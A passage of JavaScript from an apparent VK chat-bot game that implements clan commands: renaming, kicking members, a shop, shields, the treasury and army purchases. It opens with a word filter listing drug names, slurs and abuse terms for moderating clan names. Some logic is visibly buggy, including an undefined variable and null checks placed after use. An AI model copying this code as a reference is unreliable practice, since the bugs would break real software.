4:20|#|Ỏ͖͈̞̩͎̻̫̫̜͉̠̫͕̭̭̫̫̹̗̹͈̼̠̖͍͚̥͈̮̼͕̠̤̯̻̥̬̗̼̳̤̳̬̪̹͚̞̼̠͕̼̠̦͚̫͔̯̹͉͉̘͎͕̼̣̝͙̱̟̹̩̟̳̦̭͉̮̖̭̣̣̞̙̗̜̺̭̻̥͚͙̝̦̲̱͉͖͉̰̦͎̫̣̼͎͍̠̮͓̹̹͉̤̰̗̙͕͇͔̱͕̭͈̳̗̭͔̘̖̺̮̜̠͖̘͓̳͕̟̠̱̫̤͓͔̘̰̲͙͍͇̙͎̣̼̗̖͙̯͉̠̟͈͍͕̪͓̝̩̦̖̹̼̠̘̮͚̟͉̺̜͍͓̯̳̱̻͕̣̳͉̻̭̭̱͍̪̩̭̺͕̺̼̥̪͖|█|▓|▒| ẖ̨̢̨̨̢̢̧̧̛̛̛̛̹̮͓͉̜͓̩͚̼͉͖̘̗͚̰͇͉͇͓̜͚͚̯̗͓͓̲̟̲͓̬͙̹̘̮͉̲̮̤̤̼͈̜̭̻͙͚̟͈̤̝̞͚̜͎͖̺̗͓͔̝͙̪̺͖̰͖̳̯̱̼͙̦͓̙̟̻͈̪̬̙̣͇̞͇̻̺͛̒̏͒̈́̊̏̔̅̾̅́̅̆͂́͋̍̈́̑̇̿̈́́̾̔̅͐͆͆͊̊̌̋̾̏͋͌̅̆́́̇̀́̇̈́̽̾̿̋͛̈̇̋̋̄̾͊̋̈́̀̃̈́̂̅͛́́̅́͊͆́̅̀̄͗̒͂̔͊͒̌̄̕͘̚̕̚̕͜͜͝͝͝͝͝ͅͅé̴̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̛̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̿͒̾̑̌̆̀̎͋̀̈́̓̓̄̂́̃̀̈́̋̎̎͌̈́̓̃̈́̐̾̀̃̎́̈͛̽̔͊͐́͌̿̐̍̈̔̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅͘̚̚̕͘̕̚͜͝͝͠͠͝͠͠͠ͅ.̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|h̛̛͛̒̏͒̈́̊̏̔̅̾̅́̅̆͂́͋̍̈́̑̇̿̈́́̾̔̅͐͆͆͊̊̌̋̾̏͋͌̅̆́́̇̀́̇̈́̽̾̿̋͛̈̇̋̋̄̾͊̋̈́̀̃̈́̂̅͛́́̅́͊͆́̕͘̚̕̚͝͝͝͝͝|░|é̴̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̛̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̿͒̾̑̌̆̀̎͋̀̈́̓̓̄̂́̃̀̈́̋̎̎͌̈́̓̃̈́̐̾̀̃̎́̈͛̽̔͊͐́͌̿̐̍̈̔̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅͘̚̚̕͘̕̚͜͝͝͠͠͝͠͠͠ͅ.̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|̨̡̢̢̧̧̨̨̧̢̧̛͙̟̮̩̥̻̬̱̝͔̝̼̗͖͎̪̲͓͔̝̤͖̫̳̟̪͎̳̭̞̝̣̗̝̱̱̮̠̙̟̙͖̤͔͇̩͍͙̰̭̝̫̜̺̝͓̻̱̤̲͉͙̦͕̰̣̬̣̺̖̘̘̮͈̭̫͍̻̰͍̼̤̙̩͖͇̒̌͆̔̄̔̓̏͛̉͛̈́̑̑̎̈́̑͂̾͑͆̑͂͂́̋͂̄̂̒̃̆̓̐̉̀̾̽͒̎̓͐͆͑̊̉͋͋̀̈́̓̎͛̌͌̂̽̔͆̍̊̓̽̂̆̀̿̀̋̍̃̔̉̇̎̋̈́͆̈́̚͘̚̕̚͘̕͘̚̚͘̚͝͝͠͠͝͝͝ͅͅͅ|̢̢̢̧̡̧̡̢̡̧̡̡̡̨̛̥̟̹͖̲̙̪̙̠̙͍̹̦̦͇̣̯͓̯͈͔̺̺̯͚̱͔̻̖̰̖̙̟͇̘͍͉̱̟͓̞͓̘͓̟̳͕̲̞̫̱̖̗̘͇̯͎̝̹̥̲͍̥͉̳̠̥͕̗͔̟͖͇͖͓̭͖̜̱̠̳̺͚̖̒̽̿͐̅́́̊̿̉̑̑͒̔́̓̄͊̀̋̓͛̇̍̇̈́͐͑̇̌̓̓͂̎̅̕͘̕̚͜͠͠ͅ.|̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏56#͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏|56#͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏̏&|синийкит|подкладки|таурин|спайс|насвай|мморфин|сованикогданеспит|с о в а н е с п и т|сованикогданеспит|сова не спит никогда|красная сова|вк бо т |вкботру|сова никогда|сова спит|vkbot&#4448;ru|vkvot ru|vkbotru|vkbot|v k b o t . r u|в к бот|botvk|ботвк|vkbot|bot vk|пидр|трах|насилие|.com|.ru|.pw|.pro|.net|.co|.art|.website|vkmix|сова не спит|наркота|наркотики|кокс|амфетамин|кокаин|опиаты|6-мам|6-МАМ|морфин|кодеин|дигидрокодеин|6-mam|6-MAM|тебаин|буторфанол|наркотин|этилморфин|налорфин|пентазоцин|нальбуфин|бупренорфин|метамфетамин|эфедрин|псевдоэфедрин|хлорфентермин|амфепрамон|фенилэтиламин|фенилпропаноламин|сова никогда не спит|синий кит|цп|cp|изнасилование|несовершеннолетние)/;
  var sss = zapret.test(zaprets1);

  if (zapret.test(zaprets1) == true || message.args[1].toLowerCase() === "") {
    var check = true;
    return bot(
      `вы используете запрещенные слова/символы.\n\n😉 Придумайте другое название для клана.`
    );
  }
  let text = message.args[1].toLowerCase();
  var filter0 = /(http(s)?:\/\/.)?(www\.)?[-a-z0-9@:%._\+~#=]{1,256}\.[a-z]{2,6}/;
  var filter1 = /(?!http(s)?:\/\/)?(www\.)?[а-я0-9-_.]{1,256}\.(рф|срб|блог|бг|укр|рус|қаз|امارات.|مصر.|السعودية.)/;
  var lol = filter0.test(text);
  var lol1 = filter1.test(text);

  if (filter0.test(text) == true || filter1.test(text) == true) {
    var check = true;
    return bot(`подозрительная ссылка 🆘`);
  }
  let user = message.user;
  let clanid = user.clanid;
  if (clans[clanid].users[message.user.uid].level < 1)
    return bot(
      `вы не модератор клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
    );
  if (clans[clanid].balance < 10000000000)
    return bot(`на балансе клана меньше 10.000.000.000$ ${utils.pick([
      `😳`,
      `😒`,
      `😟`,
      `🙄`,
      `🤔`
    ])}
🛒 Изменение названия клану стоит 10.000.000.000$`);
  clans[clanid].balance -= 10000000000;
  clans[clanid].name = message.args[1];
  return bot(
    `вы успешно изменили название клану за 10.000.000.000$! ${utils.pick([
      `🤤`,
      `☺`,
      `🙂`,
      `😁`,
      `😏`,
      `🤑`
    ])}`
  );
});

cmd.hear(/^(?:клан состав|клан участники|клан у|состав клан|клановый состав|состав клана)$/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана, вступите или создайте клан ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    let text = ``;

    for (let id in clans[clanid].users) {
      let people = clans[clanid].users[id];
      if (clans[clanid].users[id].level == 3)
        text += `[🔥] >> [id${clans[clanid].users[id].idd}|${
          clans[clanid].users[id].names
        }] | Вложено: ${utils.sp(
          clans[clanid].users[id].vlozhil
        )}$ | Создатель.\n\n`;
      if (clans[clanid].users[id].level == 2)
        text += `[ID: ${clans[clanid].users[id].uidd}] >> [id${
          clans[clanid].users[id].idd
        }|${clans[clanid].users[id].names}] | Вложено: ${utils.sp(
          clans[clanid].users[id].vlozhil
        )}$ | Администратор.\n\n`;
      if (clans[clanid].users[id].level == 1)
        text += `[ID: ${clans[clanid].users[id].uidd}] >> [id${
          clans[clanid].users[id].idd
        }|${clans[clanid].users[id].names}] | Вложено: ${utils.sp(
          clans[clanid].users[id].vlozhil
        )}$ | Модератор.\n\n`;
      if (clans[clanid].users[id].level == 0)
        text += `[ID: ${clans[clanid].users[id].uidd}] >> [id${
          clans[clanid].users[id].idd
        }|${clans[clanid].users[id].names}] | Вложено: ${utils.sp(
          clans[clanid].users[id].vlozhil
        )}$ | Участник.\n\n`;
    }
    return bot(`участники клана «${clans[clanid].name}» [${clans[clanid].people}/50]:

${text}`);
  }
);

cmd.hear(/^(?:клан|⚔ Клан|⚔Клан|мой клан)$/i, async (message, bot) => {
  let clanid =
 
message.user.clanid;
  if (!clanid) return message.reply(`вы не состоите в клане.
Введите «клан помощь» для просмотра информации 🔔`);

  let shit = ``;
  let zel = ``;
  let minus = ``;
  if (clans[clanid].abramovich > getUnix())
    shit = `\n🏹 Действие щита: ${unixStampLefta(
      clans[clanid].abramovich - Date.now()
    )}`;
  if (clans[clanid].aue > getUnix())
    zel = `\n🍹 Зелье: ${unixStampLefta(clans[clanid].aue - Date.now())}`;
  if (clans[clanid].retin < 0) minus = `-`;

  return bot(`просмотр клана «${clans[clanid].name}»:

🆔 ID клана: ${clans[clanid].number}
👥 Участники: ${clans[clanid].people}/50
💰 Казна клана: ${utils.sp(clans[clanid].balance)}$
👑 Рейтинг клана: ${minus}${utils.sp(clans[clanid].retin)}

💸 Цена за вход: ${utils.sp(clans[clanid].price)}$${zel}
🆚 Побед: ${utils.sp(clans[clanid].good)}, поражений: ${utils.sp(clans[clanid].fuflo)}
${clans[clanid].open == true ? "🔓" : "🔒"} Тип клана: ${
    clans[clanid].open == true ? "открытый" : "закрытый"
  }
⚔ Армия: ${utils.sp(clans[clanid].zashita)}${shit}`);
});

cmd.hear(
  /^(?:ккик|изгнать|исключить|клан кик)\s([0-9]+)$/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      );
    if (clans[clanid].users[message.user.uid].level < 1)
      return bot(
        `вы не создатель/администратор/модератор клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    let user = users.find(x => x.uid === Number(message.args[1]));
    if (clans[clanid].users[message.user.uid].level == 3) {
      if (!user)
        return bot(
          `такого игрока не существует ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (clans[clanid].users[user.uid].level == 3)
        return bot(`нельзя изгнать создателя из клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}
		❌ Удаление клана: клан удалить`);
      if (user.uid == message.user.uid)
        return bot(
          `вы не можете кикнуть себя ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );

      	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
       		message: `${user.tag}, вас изгнали из клана «${
       	   clans[message.user.clanid].name
        }» ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      });

      delete clans[clanid].users[user.uid];
      clans[clanid].people -= 1;
      user.clanid = null;

      return bot(
        `вы изгнали игрока [id${user.id}|${user.tag}] из клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    }

    if (clans[clanid].users[message.user.uid].level == 2) {
      if (clans[clanid].users[user.uid].level == 2)
        return bot(
          `нельзя изгнать админа из клана ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (clans[clanid].users[user.uid].level == 3)
        return bot(
          `нельзя изгнать создателя из клана ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );

      if (!user)
        return bot(
          `такого игрока не существует ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (user.uid == message.user.uid)
        return bot(
          `вы не можете кикнуть себя ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );

      	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
        	message: `${user.tag}, вас изгнали из клана «${
          	clans[message.user.clanid].name
        }» ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      });

      delete clans[clanid].users[user.uid];
      clans[clanid].people -= 1;
      user.clanid = false;

      return bot(
        `вы изгнали игрока [id${user.id}|${user.tag}] из клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    }

    if (clans[clanid].users[message.user.uid].level == 1) {
      if (clans[clanid].users[user.uid].level == 1)
        return bot(
          `нельзя изгнать модератора из клана ${utils.pick([
            `😳`,
            `  `,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (clans[clanid].users[user.uid].level == 2)
        return bot(
          `нельзя изгнать админа из клана ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (clans[clanid].users[user.uid].level == 3)
        return bot(
          `нельзя изгнать создателя из клана ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );

      if (!user)
        return bot(
          `такого игрока не существует ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );
      if (user.uid == message.user.uid)
        return bot(
          `вы не можете кикнуть себя ${utils.pick([
            `😳`,
            `😒`,
            `😟`,
            `🙄`,
            `🤔`
          ])}`
        );

      	vk.api.messages.send({
        	user_id: user.id,
        	random_id: 0,
        	message: `${user.tag}, вас изгнали из клана «${
        	clans[message.user.clanid].name
        }» ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      });

      delete clans[clanid].users[user.uid];
      clans[clanid].people -= 1;
      user.clanid = false;

      return bot(
        `вы изгнали игрока [id${user.id}|${user.tag}] из клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    }
  }
);

cmd.hear(
  /^(?:клан магазин|магазин клана|клановый магазин)$/i,
  async (message, bot) => {
    return bot(
      `магазин:

1⃣ Армия (100 единиц) — 300.000.000.000$
🛒 Купить: армия [кол-во]

2⃣ Щит на сутки — 150.000.000.000$
🛒 Купить: купить щит



❌ Щит пропадает при атаке на любой клан.`,

      {
        keyboard: JSON.stringify({
          inline: true,
          buttons: [
            [
              {
                action: {
                  type: "text",
                  payload: "{}",
                  label: `🛡 Щит`
                },
                color: "positive"
              }
            ]
          ]
        })
      }
    );
  }
);

cmd.hear(/^(?:купить щит|🛡 Щит)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(
      `у вас нет клана, вступите или создайте клан ${utils.pick([
        `??`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].balance < 150000000000)
    return bot(`на балансе вашего клана меньше 150.000.000.000$`);
  let id = message.user.uid;
  if (clans[clanid].users[id].level < 2)
    return bot(
      `вы не создатель/администратор клана ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].abramovich > getUnix())
    return bot(
      `у вашего клана уже имеется щит, он закончится через ${unixStampLeft(
        clans[clanid].abramovich - Date.now()
      )} ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
    );

  clans[clanid].balance -= 150000000000;
  clans[clanid].abramovich = getUnix() + 86400000;
  return bot(`вы купили щит на 24 часа для клана ${utils.pick([
    `🤤`,
    `☺`,
    `🙂`,
    `😁`,
    `😏`,
    `🤑`
  ])}

❌ Щит пропадает при любой атаке с вашей стороны.`);
});

cmd.hear(
  /^(?:клан помощь|клан помошь|клан помош|«клан помощь»|клан помощ)$/i,
  async (message, bot) => {
    return bot(`команды для клана:

🏹 Мой клан:
⠀⠀🔥 Клан
⠀⠀💰 Казна
⠀⠀⚔ Атаковать
⠀⠀💸 Клан цена
⠀⠀✒ Клан название
⠀⠀🛍 Клан магазин
⠀⠀🔓 Клан открыть/Клан закрыть
⠀⠀❌ Клан удалить

⚔ Топ клан
📚 Кпомощь
🏹 Клан создать
🔔 Оповещения [вкл/выкл]

👤 Участники:
⠀⠀👥 Клан состав
⠀⠀🚪 Клан вступить
⠀⠀🗣 Пригласить
⠀⠀⏫ Повысить/Понизить
⠀⠀🏃‍♂ Клан кик
⠀⠀❌ Покинуть

🅰 Админ в клане может приглашать и исключать игроков, изменять клан, проводить атаки.

📜 Модератор в клане может изменять название, исключать игроков.`);
  }
);

cmd.hear(
  /^(?:кпомощь|кпомошь|кпомош|помощь клан|команды клана|клан команды|💡 Клан Помощь)/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана, вступите или создайте клан ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    let id = message.user.uid;
    if (clans[clanid].users[id].level < 1) {
      return bot(`клановые команды:

🔥 Клан — ваш клан
👥 Клан состав — состав клана
💸 Казна — пополнить казну
⚔ Топ клан — топ кланов

❌ Покинуть — выход из клана`);
    }

    if (clans[clanid].users[id].level == 1) {
      return bot(`клановые команды:

🔥 Клан — ваш клан
👥 Клан состав — состав клана
💸 Казна — пополнить казну
✒ Клан название — название клана
🏃‍♂ Клан кик — изгнать соклана
⚔ Топ клан — топ кланов

❌ Покинуть — выход из клана`);
    }

    if (clans[clanid].users[id].level == 2) {
      return bot(`клановые команды:

🔥 Клан — ваш клан
👥 Клан состав — состав клана
💸 Казна — пополнить казну
✒ Клан название — название клана
🏃‍♂ Клан кик — изгнать соклана
⏫ Повысить/Понизить
🔓 Клан открыть/Клан закрыть
🛍 Клан магазин
🗣 Пригласить — пригласить игрока
🤑 Клан цена — цена за вход
💪🏻 Атаковать — война
⚔ Топ клан — топ кланов

❌ Покинуть — выход из клана`);
    }

    if (clans[clanid].users[id].level == 3) {
      return bot(`клановые команды:

🔥 Клан — ваш клан
👥 Клан состав — состав клана
💸 Казна — пополнить казну
✒ Клан название — название клана
🏃‍♂ Клан кик — изгнать соклана
⏫ Повысить/Понизить
🔓 Клан открыть/Клан закрыть
🛍 Клан магазин
🗣 Пригласить — пригласить игрока
🤑 Клан цена — цена за вход
💪🏻 Атаковать — война
⚔ Топ клан — топ кланов

❌ Удалить клан — удаление клана`);
    }
  }
);

cmd.hear(
  /^(?:кбанк|кбаланс|казна|клан казна|кказна|баланс клана|клан положить|кположить)$/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана, вступите или создайте клан ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    return bot(`баланс вашего клана: ${utils.sp(
      clans[clanid].balance
    )}$ ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}

💸 Пополнить: казна [сумма]`);
  }
);

cmd.hear(
  /^(?:кположить|казна|клан казна|казна клан|клан положить|клан банк|банк клан|клан пополнить)\s(.*)$/i,
  async (message, bot) => {
    if(message.user.settings.adm || message.user.settings.vseya || message.user.settings.tex || message.user.settings.play)
      return bot(`Администрации запрещено пополнять казну клана 😭`);

    message.args[1] = message.args[1].replace(/(\.|\,)/gi, "");
    message.args[1] = message.args[1].replace(/(к|k)/gi, "000");
    message.args[1] = message.args[1].replace(/(м|m)/gi, "000000");
    message.args[1] = message.args[1].replace(
      /(вабанк|вобанк|все|всё)/gi,
      message.user.balance
    );
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана, вступите или создайте клан ${utils.pick([
          `🤤`,
          `☺`,
          `🙂`,
          `😁`,
          `😏`,
          `🤑`
        ])}`
      );
    if (!Number(message.args[1]))
      return bot(`баланс вашего клана: ${utils.sp(
        clans[clanid].balance
      )}$ ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}

💸 Пополнить: казна [сумма]`);
    message.args[1] = Math.floor(Number(message.args[1]));

    if (message.args[1] > message.user.balance)
      return bot(`вклад не может превышать ваш баланс ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}
💰 Баланс: ${utils.sp(message.user.balance)}$`);
    if (message.args[1] <= 0)
      return bot(`баланс вашего клана: ${utils.sp(
        clans[clanid].balance
      )}$ ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}

💸 Пополнить: казна [сумма]`);

    let id = message.user.uid;
    message.user.balance -= message.args[1];
    clans[clanid].balance += message.args[1];
    clans[clanid].users[id].vlozhil += message.args[1];
    await message.send(
      	`вы успешно положили ${utils.sp(
       	 message.args[1]
      )}$ в банк клана ${utils.pick([`🤤`, `☺`, `🙂`, `😁`, `😏`, `🤑`])}`
    );
    let user = users.find(x => x.id === clans[clanid].owner)
    if(user.notifications == true){
      Bot.api.messages.send({
        user_id: user.id,
        random_id: 0,
        message: `🗣 Игрок [id${message.user.id}|${message.user.tag}] положил в казну клана «${clans[idclan].name}» ${utils.sp(message.args[1])}$

		▶ Введите «Оповещения выкл» для отключения всех клановых оповещений.`
      });
    }
  }
);

cmd.hear(/^(?:клан удалить|кудалить)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if(!clanid)
    return bot(`у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`);
  if(clans[clanid].users[message.user.uid].level < 3)
    return bot(
      `вы не создатель клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
    );
  if (clans[clanid].people > 1)
    return bot(
      `в клане имеются люди, сначала исключите их всех ${utils.pick([
        `😳`,
        `😒`,
        `😟`,
        `🙄`,
        `🤔`
      ])}`
    );
  if (clans[clanid].topsk < getUnix()) {
    clans[clanid].topsk = getUnix() + 600000;
    return bot(
      `вы уверены в удалении клана? 🤔

❌ Введите для удаления: клан удалить`,
      {
        keyboard: JSON.stringify({
          inline: true,
          buttons: [
            [
              {
                action: {
                  type: "text",
                  payload: "{}",
                  label: "клан удалить"
                },
                color: "negative"
              }
            ]
          ]
        })
      }
    );
  }
  delete clans[clanid];
  message.user.clanid = false;
  return bot(
    `вы удалили свой клан ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
  );
});

cmd.hear(/^(?:армия|армии)$/i, async (message, bot) => {
  let clanid = message.user.clanid;
  if (!clanid)
    return bot(`у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`);
  return bot(`армии в вашем клане: ${utils.sp(clans[clanid].zashita)} ⚔

🛍 Купить: армия [кол-во]
🛒 Магазин: клан магазин`);
});

cmd.hear(
  /^(?:армия|армии|клан армия|купить армию|армию|единица армии)\s(.*)$/i,
  async (message, bot) => {
    let clanid = message.user.clanid;
    if (!clanid)
      return bot(
        `у вас нет клана ${utils.pick([`😳`, `😒`, `😟`, `🙄`, `🤔`])}`
      );

    message.args[1] = message.args[1].replace(/(\.|\,)/gi, "");
    message.args[1] = message.args[1].replace(/(к|k)/gi, "000");
    message.args[1] = message.args[1].replace(/(м|m)/gi, "000000");
    message.args[1] = Math.floor(Number(message.args[1]));
    let id = message.user.uid;
    let pay = 3000000000;
    if (clans[clanid].users[id].level < 2)
      return bot(
        `вы не создатель/администратор клана ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (clans[clanid].balance < 300000000000)
      return bot(
        `на балансе вашего клана меньше 300.000.000.000$ ${utils.pick([
          `😳`,
          `😒`,
          `😟`,
          `🙄`,
          `🤔`
        ])}`
      );
    if (message.args[1] < 100)
      return bot(`покупка армии идёт от 100 единиц! ${utils.pick([
        `🤤`,
        `☺`,
        `🙂`,
        `😁`,
        `😏`,
        `🤑`
      ])}
🛍 Пример: армия 100`);
    if (!Number(message.args[1]))
      return bot(`армии в вашем клане: ${utils.sp(clans[clanid].zashita)} ⚔

🛍 Купить: армия [кол-во]
🛒 Магазин: клан магазин`);
    if (message.args[1] <= 0)
      return bot(`армии в вашем клане: ${utils.sp(clans[clanid].zashita)} ⚔

🛍 Купить: армия [кол-во]
🛒 Магазин: клан магазин`);

    if (message.args[1] * pay > clans[clanid].balance) {
      var armich = Math.floor(clans[clanid].balance / 3000000000);
      return bot(
        `баланса вашего клана хватает на покупку ${utils.sp(
          armich
        )} единиц армии ⚔`
      );
    } else {
      var stick = utils.pick([19448, 50465]);
      clans[clanid].balance -= message.args[1] * pay;
      clans[clanid].zashita += message.args[1];

      bot(`вы купили ${utils.sp(message.args[1])} единиц армии за ${utils.sp(
        message.args[1] * pay
      )}$ ⚔

💰 Баланс клана: ${utils.sp(clans[clanid].balance)}$`);
      let user = users.find(x => x.id === clans[clanid].owner)
    if(user.notifications == true){
      vk.api.messages.send({
        user_id: user.id,
        random_id: 0,
        message: `🗣 Игрок [id${message.user.id}|${message.user.tag}] положил в казну клана «${clans[clanid].name}» ${utils.sp(message.args[1])}$

		▶ Введите «Оповещения выкл» для отключения всех клановых оповещений.`
      });
    }
